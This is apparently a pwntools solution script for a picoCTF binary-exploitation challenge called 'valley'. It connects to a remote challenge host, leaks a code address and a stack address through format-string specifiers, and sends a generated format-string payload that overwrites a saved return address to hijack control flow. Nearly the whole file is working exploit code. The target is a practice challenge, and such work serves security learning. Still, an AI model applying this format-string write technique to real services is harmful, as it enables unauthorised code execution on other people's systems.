from pwn import *

context.log_level="DEBUG"
context.binary=ELF("./valley")
# Start the process
p = remote('shape-facility.picoctf.net', 57259)
#p = process("./valley")
print(p.recv())

# leak address of main
p.sendline(b"%21$p")
leaked_main = p.recv().decode("utf-8").strip()[27:]
leaked_main = int(leaked_main, 16)
leaked_main -= 426 # offset

# stack offset 0x7fffffffd588 - 0x7fffffffd360

p.sendline(b"%20$p")
leaked_stack = p.recv().decode("utf-8").strip()[27:]
leaked_stack = int(leaked_stack, 16)
leaked_stack -= 8 # offset

print(hex(leaked_main))
print(hex(leaked_stack))

# Craft the payload to write the new value to the specified address
payload = fmtstr_payload(6, {leaked_stack: leaked_main}, write_size="short")
print(payload)

p.sendline(payload)
print(p.recv())

p.sendline(b"exit")
print(p.recvall())
